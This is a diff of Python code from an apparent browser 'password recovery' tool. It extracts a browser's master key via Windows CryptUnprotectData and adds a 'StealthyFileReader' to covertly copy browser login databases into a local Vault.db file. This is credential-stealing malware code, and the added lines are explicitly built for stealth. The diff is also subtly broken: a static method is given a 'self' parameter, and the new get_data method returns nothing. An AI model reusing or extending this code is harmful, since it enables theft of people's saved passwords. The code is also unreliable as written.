@@ -8,17 +8,24 @@ from win32crypt import CryptUnprotectData
 import logging
 from Utilities.DataSaver import DataSaverUtility
 
+from Utilities.StealthReader import StealthyFileReader
+
+
 logging.basicConfig(level=logging.WARNING)
 
 class PasswordUtils:
     @staticmethod
-    def get_master_key(path: str):
+
+    def get_master_key(self, path: str):
+
         local_state_path = os.path.join(path, "Local State")
         if not os.path.exists(local_state_path):
             return None
         
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state_content = f.read()
+
+        reader = StealthyFileReader(local_state_path)
+        local_state_content = reader.read_text()
+
         
         if 'os_crypt' not in local_state_content:
             return None
@@ -27,6 +34,19 @@ class PasswordUtils:
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
         return key
+
+    def get_data(self, browser, path, profile, key, type_of_data, query_name):
+        db_file = os.path.join(path, profile + type_of_data["file"])
+        if not os.path.exists(db_file):
+            logging.warning(f"DB file {db_file} does not exist.")
+            return []
+
+        # Use StealthyFileReader to copy the db content stealthily
+        reader = StealthyFileReader(db_file)
+        db_content = reader.read()
+        with open('Vault.db', 'wb') as tmp_file:
+            tmp_file.write(db_content)
+
 
     @staticmethod
     def decrypt_password(encrypted_password: bytes, key: bytes) -> str:
@@ -168,7 +188,9 @@ class BrowserPasswordRecovery:
 
         for browser in self.installed_browsers():
             browser_path = self.Browsers[browser]
-            master_key = PasswordUtils.get_master_key(browser_path)
+
+            master_key = PasswordUtils.get_master_key(self, browser_path)
+
             if not master_key:
                 continue
             
